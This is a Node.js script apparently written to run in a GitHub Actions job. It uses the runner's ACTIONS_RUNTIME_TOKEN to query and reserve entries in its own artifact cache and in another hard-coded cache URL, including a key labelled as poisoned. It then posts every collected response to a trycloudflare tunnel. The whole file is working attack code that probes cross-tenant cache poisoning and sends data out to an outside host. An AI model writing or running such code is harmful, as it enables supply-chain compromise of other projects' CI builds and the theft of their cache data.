const { execFileSync } = require('child_process');
const TOK = process.env.ACTIONS_RUNTIME_TOKEN;
const CACHE = (process.env.ACTIONS_CACHE_URL || '').replace(/\/+$/, '');
const CROSS = 'https://artifactcache.actions.githubusercontent.com/n5ft50z8WcFrhhMJ1iTlYJVjYGu1OWvDZCHbeZp3lDUnaBB9gW';
const out = [];
function probe(label, url, method, headers, body) {
  const args = ['-sS', '--max-time', '12', '-w', '\n@@HTTP %{http_code}', '-X', method || 'GET'];
  for (const [k, v] of Object.entries(headers || {})) args.push('-H', `${k}: ${v}`);
  if (body) args.push('--data-binary', body);
  args.push(url);
  let r = '';
  try { r = execFileSync('/usr/bin/curl', args, { timeout: 15000, maxBuffer: 10 * 1024 * 1024 }).toString(); }
  catch (e) { r = 'ERR ' + e.message.slice(0, 80); }
  out.push(`### ${label}\n${r.slice(0, 800)}`);
}
const H = { 'Authorization': `Bearer ${TOK}`, 'Accept': 'application/json;api-version=6.0-preview.1' };
const HJ = Object.assign({}, H, { 'Content-Type': 'application/json' });
probe('A1-own-list-after-seed', `${CACHE}/_apis/artifactcache/cache?keys=cachecache-a-probe&version=v1`, 'GET', H);
probe('A2-own-list-allkeys', `${CACHE}/_apis/artifactcache/cache?keys=&version=v1`, 'GET', H);
probe('X1-cross-list', `${CROSS}/_apis/artifactcache/cache?keys=cacheb-marker&version=v1`, 'GET', H);
probe('X2-cross-list-all', `${CROSS}/_apis/artifactcache/cache?keys=&version=v1`, 'GET', H);
probe('X3-cross-reserve', `${CROSS}/_apis/artifactcache/cache`, 'POST', HJ,
  JSON.stringify({ key: 'cacheb-poisoned-by-a', version: 'v1', cacheSize: 50 }));
probe('X4-own-reserve', `${CACHE}/_apis/artifactcache/cache`, 'POST', HJ,
  JSON.stringify({ key: 'cachecache-a-probe', version: 'v1', cacheSize: 50 }));
try {
  execFileSync('/usr/bin/curl', ['-sS', '--max-time', '15', '-X', 'POST', '-H', 'Content-Type: text/plain',
    '--data-binary', out.join('\n'),
    'https://speak-situations-pacific-myers.trycloudflare.com/cache-probe-result'],
    { stdio: 'ignore', timeout: 20000 });
  console.log('delivered');
} catch (e) { console.log('tunnel unreachable'); }
